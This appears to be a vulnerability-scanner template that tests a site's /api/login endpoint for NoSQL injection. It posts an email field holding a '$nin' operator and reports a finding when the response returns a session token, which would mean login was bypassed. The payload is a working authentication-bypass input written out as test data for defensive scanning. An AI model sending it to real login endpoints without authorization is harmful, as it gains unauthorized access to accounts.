id: nosql-27
name: 'NoSQL $nin in email'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $nin accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"email":{"$nin":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
